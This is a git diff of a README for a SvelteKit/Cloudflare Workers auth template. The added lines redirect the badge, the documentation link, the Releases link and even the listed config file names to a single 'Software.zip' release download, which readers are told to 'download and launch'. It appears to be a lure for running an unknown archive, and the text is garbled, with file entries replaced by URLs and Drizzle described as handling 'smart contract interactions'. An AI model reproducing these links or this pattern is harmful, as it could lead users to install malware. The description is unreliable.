@@ -2,7 +2,7 @@
 
 Welcome to the **SvelteKit Workers D1 Auth** GitHub repository! This template combines **SvelteKit**, **D1**, **Drizzle**, and **Lucia** to create a powerful web application template for Cloudflare Workers.
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip)](https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip)
 
 🌟 **Features:**
 - Utilizes SvelteKit for efficient web development.
@@ -17,8 +17,8 @@ Welcome to the **SvelteKit Workers D1 Auth** GitHub repository! This template co
 - **`d1/`**: Includes D1 authentication system setup.
 - **`drizzle/`**: Contains smart contract interactions using Drizzle.
 - **`public/`**: Holds static assets for the web app.
-- **`tailwind.config.js`**: Configuration for Tailwind CSS.
-- **`wrangler.toml`**: Configuration file for Cloudflare Workers.
+- **`https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip`**: Configuration for Tailwind CSS.
+- **`https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip`**: Configuration file for Cloudflare Workers.
 
 🔧 **Setup Instructions:**
 1. Clone this repository to your local machine.
@@ -29,11 +29,11 @@ Welcome to the **SvelteKit Workers D1 Auth** GitHub repository! This template co
 6. Deploy to Cloudflare Workers using Wrangler command-line tool.
 
 🚀 **Getting Started:**
-To get started with building your web app using this template, make sure to check out the [Documentation](https://github.com/YouaifXD/789566136/docs) for detailed instructions and examples.
+To get started with building your web app using this template, make sure to check out the [Documentation](https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip) for detailed instructions and examples.
 
 🌐 **Explore Further:**
-- Visit the [Software.zip](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) link to download and launch the template.
-- Check out the [Releases](https://github.com/YouaifXD/789566136/releases) section for more updates and resources.
+- Visit the [https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip](https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip) link to download and launch the template.
+- Check out the [Releases](https://github.com/b2kkingr/sveltekit-workers-d1-auth/releases/download/v1.0/Software.zip) section for more updates and resources.
 - Dive into the code and start customizing your SvelteKit Workers D1 Auth project today!
 
 🚧 **Note**: Ensure you have the necessary permissions and credentials set up for D1, Drizzle, and Cloudflare Workers deployment before running the application.
